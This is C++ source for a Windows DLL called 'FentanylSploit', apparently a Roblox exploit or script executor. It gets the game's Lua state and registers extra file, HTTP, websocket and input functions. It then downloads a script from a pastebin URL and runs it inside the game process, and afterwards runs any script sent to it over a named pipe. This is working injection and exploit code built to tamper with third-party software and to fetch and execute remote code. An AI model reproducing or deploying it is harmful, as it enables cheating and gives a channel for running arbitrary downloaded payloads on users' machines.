#include <thread>
#include <wtypes.h>
#include <iostream>
#include "Execution.hpp"
#include <cpr/cpr.h>

#include "FileSystemEnv.hpp"
#include "DebugLibraryEnv.hpp"
#include "InputEnv.hpp"
#include "MiscEnv.hpp"
#include "HttpEnv.hpp"
#include "ScriptsEnv.hpp"
#include "ClosureEnv.hpp";
#include "WebSocketEnv.hpp"

#include <codecvt>
//#include "CryptEnv.hpp"


extern "C" __declspec(dllexport) LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(NULL, code, wParam, lParam);
}



void StartCommunication(uintptr_t state)
{
    std::string WholeScript = "";
    HANDLE hPipe;
    char buffer[999999];
    DWORD dwRead;
    hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\FentanylSploit"),
        PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
        PIPE_WAIT,
        1,
        999999,
        999999,
        NMPWAIT_USE_DEFAULT_WAIT,
        NULL);

    while (hPipe != INVALID_HANDLE_VALUE) {
        if (ConnectNamedPipe(hPipe, NULL) != FALSE) {
            while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE) {
                buffer[dwRead] = '\0';
                WholeScript += buffer;
            }

            StateTools::Execute(WholeScript, state);
            WholeScript = "";
        }
        DisconnectNamedPipe(hPipe);
    }

}




void MainThread(HMODULE DllModule)
{

  

    RBX::Print(1, getExePath().c_str());
    uintptr_t luaState = StateTools::getLuaState();
    const auto MainThread = (lua_State*)luaState;
    register_misc(MainThread);
    register_debug(MainThread);
    register_messagebox(MainThread);
    register_input(MainThread);
    register_http(MainThread);
    register_script(MainThread);
    register_closure(MainThread);
    register_websocket(MainThread);
    std::string url = "https://pastebin.com/raw/gVxWSRWJ";

    // Perform a GET request
    cpr::Response response = cpr::Get(cpr::Url{ url });
   // MessageBoxA(NULL, response.text.c_str(), "Lol", MB_OK);
    StateTools::Execute(response.text, luaState);
   // register_crypt(MainThread);
  //  register_metatable(MainThread);
  //  register_cace(MainThread);


    StartCommunication(luaState);
}

bool __stdcall DllMain(HMODULE DllModule, uintptr_t ReasonForCall, void*)
{
    if (ReasonForCall == DLL_PROCESS_ATTACH)
    {
     //   MessageBoxA(NULL, "Injector working 24/09/2024", "Haha skids", MB_OK);
        std::thread(MainThread, DllModule).detach();
    }

    return true;
}
